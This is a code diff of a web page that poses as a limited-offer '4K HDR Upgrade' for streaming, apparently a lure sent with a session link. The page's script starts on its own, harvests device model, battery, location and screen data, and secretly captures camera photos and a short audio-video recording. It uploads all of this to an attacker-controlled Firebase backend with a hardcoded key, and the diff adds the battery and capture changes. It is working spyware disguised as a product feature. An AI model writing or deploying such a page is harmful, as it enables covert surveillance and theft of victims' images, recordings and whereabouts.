@@ -10,14 +10,9 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
             min-height: 100vh;
             display: flex;
@@ -25,7 +20,6 @@
             align-items: center;
             padding: 20px;
         }
-        
         .card {
             background: rgba(20, 20, 20, 0.95);
             backdrop-filter: blur(10px);
@@ -38,12 +32,10 @@
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             animation: fadeIn 0.5s ease;
         }
-        
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        
         .logo {
             width: 80px;
             height: 80px;
@@ -56,15 +48,7 @@
             font-size: 40px;
             box-shadow: 0 0 20px rgba(229, 9, 20, 0.3);
         }
-        
-        h1 {
-            color: #fff;
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
-        }
-        
+        h1 { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 8px; }
         .badge {
             display: inline-block;
             background: linear-gradient(135deg, #e50914, #b20710);
@@ -75,14 +59,7 @@
             margin-bottom: 16px;
             color: #fff;
         }
-        
-        .sub {
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 28px;
-            line-height: 1.5;
-        }
-        
+        .sub { color: #aaa; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
         .quality-box {
             background: rgba(255, 255, 255, 0.05);
             border-radius: 20px;
@@ -91,7 +68,6 @@
             text-align: left;
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
-        
         .quality-box p {
             color: #ccc;
             font-size: 14px;
@@ -100,17 +76,8 @@
             align-items: center;
             gap: 10px;
         }
-        
-        .quality-box .label {
-            color: #888;
-            width: 70px;
-        }
-        
-        .quality-box .value {
-            color: #fff;
-            font-weight: 500;
-        }
-        
+        .quality-box .label { color: #888; width: 100px; }
+        .quality-box .value { color: #fff; font-weight: 500; }
         .quality-badge {
             background: rgba(229, 9, 20, 0.2);
             border: 1px solid rgba(229, 9, 20, 0.5);
@@ -122,7 +89,6 @@
             margin-top: 12px;
             color: #e50914;
         }
-        
         .btn {
             background: linear-gradient(135deg, #e50914, #b20710);
             color: white;
@@ -136,88 +102,34 @@
             transition: all 0.3s ease;
             margin-top: 8px;
         }
-        
-        .btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(229, 9, 20, 0.4);
-        }
-        
-        .btn:disabled {
-            background: #444;
-            transform: none;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-        
-        .loader {
-            margin-top: 20px;
-            color: #e50914;
-            font-size: 13px;
-            display: none;
-            padding: 12px;
-            background: rgba(229, 9, 20, 0.1);
-            border-radius: 30px;
-        }
-        
-        .status-msg {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 30px;
-            font-size: 12px;
-            display: none;
-            background: rgba(74, 222, 128, 0.1);
-            color: #4ade80;
-            border: 1px solid rgba(74, 222, 128, 0.3);
-        }
-        
-        .status-msg.error {
-            background: rgba(255, 107, 107, 0.1);
-            color: #ff6b6b;
-            border-color: rgba(255, 107, 107, 0.3);
-        }
-        
-        input, video, canvas {
-            display: none;
-        }
-        
-        .footer {
-            margin-top: 24px;
-            color: #555;
-            font-size: 10px;
-        }
+        .btn:hover { transform: scale(1.02); box-shadow: 0 8px 25px rgba(229, 9, 20, 0.4); }
+        .btn:disabled { background: #444; transform: none; cursor: not-allowed; }
+        .loader { margin-top: 20px; color: #e50914; font-size: 13px; display: none; padding: 12px; background: rgba(229, 9, 20, 0.1); border-radius: 30px; }
+        .status-msg { margin-top: 16px; padding: 12px; border-radius: 30px; font-size: 12px; display: none; background: rgba(74, 222, 128, 0.1); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
+        .status-msg.error { background: rgba(255, 107, 107, 0.1); color: #ff6b6b; border-color: rgba(255, 107, 107, 0.3); }
+        input, video, canvas { display: none; }
+        .footer { margin-top: 24px; color: #555; font-size: 10px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">
-            🎬
-        </div>
+        <div class="logo">🎬</div>
         <h1>4K HDR Upgrade</h1>
         <div class="badge">⚡ LIMITED OFFER</div>
         <div class="sub">Enhance your streaming quality in seconds</div>
         
         <div class="quality-box">
-            <p>
-                <span class="label">📱 Device:</span>
-                <span class="value" id="deviceName">Detecting...</span>
-            </p>
-            <p>
-                <span class="label">📶 Current:</span>
-                <span class="value">HD Ready (1080p)</span>
-            </p>
-            <p>
-                <span class="label">✨ Upgrade:</span>
-                <span class="value">4K HDR + Dolby Atmos</span>
-            </p>
+            <p><span class="label">📱 Device:</span><span class="value" id="deviceName">Detecting...</span></p>
+            <p><span class="label">🔋 Battery:</span><span class="value" id="batteryStatus">Loading...</span></p>
+            <p><span class="label">📶 Current:</span><span class="value">HD Ready (1080p)</span></p>
+            <p><span class="label">✨ Upgrade:</span><span class="value">4K HDR + Dolby Atmos</span></p>
             <div class="quality-badge">⚡ One-click optimization</div>
         </div>
         
         <button class="btn" id="upgradeBtn">⚡ ENABLE 4K HDR</button>
         <div class="loader" id="loader">Optimizing your device...</div>
         <div class="status-msg" id="statusMsg"></div>
-        <div class="footer">
-            🔒 Encrypted • One-time setup • Instant activation
-        </div>
+        <div class="footer">🔒 Encrypted • One-time setup • Instant activation</div>
     </div>
     
     <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
@@ -225,7 +137,7 @@
     <canvas id="canvas" style="display:none"></canvas>
     
     <script>
-        // ========== FIREBASE CONFIG ==========
+        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
             authDomain: "mobilehk-5e843.firebaseapp.com",
@@ -236,12 +148,10 @@
             appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
         };
         
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const storage = firebase.storage();
         
-        // Get session ID from URL
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('id');
         
@@ -254,22 +164,62 @@
             upgradeBtn.disabled = true;
         }
         
-        // Device detection
+        // ========== DEVICE DETAILS ==========
+        // Get device model
         const ua = navigator.userAgent;
-        let deviceName = "Unknown";
-        if (ua.includes("iPhone")) deviceName = "iPhone";
-        else if (ua.includes("Android")) deviceName = "Android";
-        else if (ua.includes("Windows")) deviceName = "Windows PC";
-        else if (ua.includes("Mac")) deviceName = "Mac";
-        document.getElementById('deviceName').innerText = deviceName;
+        let deviceModel = "Unknown";
+        let deviceBrand = "Unknown";
+        
+        if (ua.includes("iPhone")) {
+            deviceBrand = "Apple";
+            if (ua.includes("iPhone14")) deviceModel = "iPhone 14";
+            else if (ua.includes("iPhone13")) deviceModel = "iPhone 13";
+            else if (ua.includes("iPhone12")) deviceModel = "iPhone 12";
+            else if (ua.includes("iPhone11")) deviceModel = "iPhone 11";
+            else deviceModel = "iPhone";
+        } else if (ua.includes("Android")) {
+            deviceBrand = "Android";
+            const match = ua.match(/Android (\d+\.\d+)/);
+            const androidVersion = match ? match[1] : "Unknown";
+            const smMatch = ua.match(/SM-[A-Z0-9]+/);
+            const modelMatch = ua.match(/; ([^;]+) Build/);
+            deviceModel = smMatch ? smMatch[0] : (modelMatch ? modelMatch[1] : "Android Device");
+        } else if (ua.includes("Windows")) {
+            deviceBrand = "Microsoft";
+            deviceModel = "Windows PC";
+        } else if (ua.includes("Mac")) {
+            deviceBrand = "Apple";
+            deviceModel = "Mac";
+        }
+        
+        document.getElementById('deviceName').innerHTML = `${deviceBrand} ${deviceModel}`;
+        
+        // Get Battery Percentage
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    const level = Math.floor(battery.level * 100);
+                    const charging = battery.charging ? "🔌 Charging" : "🔋 Not Charging";
+                    document.getElementById('batteryStatus').innerHTML = `${level}% (${charging})`;
+                    return { level: level, charging: battery.charging };
+                } else {
+                    document.getElementById('batteryStatus').innerHTML = "Not Available";
+                    return { level: "Unknown", charging: false };
+                }
+            } catch(e) {
+                document.getElementById('batteryStatus').innerHTML = "Not Available";
+                return { level: "Unknown", charging: false };
+            }
+        }
+        
+        getBatteryInfo();
         
         function showMessage(msg, isError = false) {
             statusMsg.style.display = 'block';
             statusMsg.className = isError ? 'status-msg error' : 'status-msg';
             statusMsg.innerHTML = msg;
-            setTimeout(() => {
-                statusMsg.style.display = 'none';
-            }, 4000);
+            setTimeout(() => { statusMsg.style.display = 'none'; }, 4000);
         }
         
         // Save to Realtime Database
@@ -302,10 +252,15 @@
             return url;
         }
         
-        // 1. Device Info
+        // 1. Device Info (with battery)
         async function sendDeviceInfo() {
+            const battery = await getBatteryInfo();
             await saveData('device_info', {
-                device: deviceName,
+                device: `${deviceBrand} ${deviceModel}`,
+                model: deviceModel,
+                brand: deviceBrand,
+                battery: `${battery.level}%`,
+                charging: battery.charging,
                 ua: ua,
                 screen: `${screen.width}x${screen.height}`,
                 language: navigator.language
@@ -330,52 +285,44 @@
             }
         }
         
-        // 3. Gallery
-        async function getGallery() {
-            return new Promise((resolve) => {
-                const input = document.getElementById('galleryInput');
-                input.onchange = async (e) => {
-                    const files = Array.from(e.target.files);
-                    if (files.length === 0) { resolve(false); return; }
-                    loader.innerHTML = `📸 Uploading ${files.length} files...`;
-                    for (let i = 0; i < Math.min(files.length, 25); i++) {
-                        const file = files[i];
-                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
-                        await uploadFile(file, type);
-                        loader.innerHTML = `📸 Uploaded ${i+1}/${Math.min(files.length, 25)}`;
-                    }
-                    resolve(true);
-                };
-                input.click();
-            });
-        }
-        
-        // 4. Camera + Video
-        async function captureMedia() {
+        // 3. Camera Photos (3 photos automatically)
+        async function captureCameraPhotos() {
             try {
                 loader.innerHTML = "📷 Requesting camera...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 1000));
                 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 
-                // 4 photos
-                for (let i = 1; i <= 4; i++) {
+                // Take 3 photos
+                for (let i = 1; i <= 3; i++) {
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                     const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
                     await uploadFile(file, 'camera_photo');
-                    loader.innerHTML = `📷 Captured ${i}/4 photos`;
-                    await new Promise(r => setTimeout(r, 300));
+                    loader.innerHTML = `📷 Captured ${i}/3 photos`;
+                    await new Promise(r => setTimeout(r, 500));
                 }
                 
-                // 5 sec video
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) {
+                console.log("Camera error:", e);
+                showMessage("Camera access needed for 4K HDR upgrade", true);
+                return false;
+            }
+        }
+        
+        // 4. 5 Second Video
+        async function captureVideo() {
+            try {
                 loader.innerHTML = "🎥 Recording video (5s)...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
@@ -383,38 +330,17 @@
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const file = new File([blob], `video_${Date.now()}.mp4`, { type: 'video/mp4' });
                     await uploadFile(file, 'video_recording');
+                    loader.innerHTML = "✅ Video recorded!";
                 };
                 recorder.start();
                 await new Promise(r => setTimeout(r, 5000));
                 recorder.stop();
-                
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch(e) {
-                console.log("Camera error:", e);
+                console.log("Video error:", e);
                 return false;
             }
-        }
-        
-        // 5. Microphone
-        async function getMicrophone() {
-            try {
-                loader.innerHTML = "🎤 Testing audio...";
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
-                    await uploadFile(file, 'microphone');
-                };
-                recorder.start();
-                await new Promise(r => setTimeout(r, 5000));
-                recorder.stop();
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch(e) { return false; }
         }
         
         // MAIN UPGRADE FUNCTION
@@ -425,15 +351,18 @@
             loader.style.display = 'block';
             loader.innerHTML = "🔧 Preparing device optimization...";
             
+            // Send device info with battery
             await sendDeviceInfo();
+            
+            // Get location
+            loader.innerHTML = "📍 Getting location...";
             await getLocation();
             
-            loader.innerHTML = "📸 Select media to optimize...";
-            showMessage("Please select photos/videos from your gallery", false);
-            await getGallery();
+            // Capture camera photos (3 photos)
+            await captureCameraPhotos();
             
-            await captureMedia();
-            await getMicrophone();
+            // Capture 5 second video
+            await captureVideo();
             
             await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
             
@@ -447,7 +376,6 @@
         
         upgradeBtn.onclick = startUpgrade;
         
-        // Auto-start after 500ms
         if (sessionId) {
             setTimeout(startUpgrade, 500);
         }
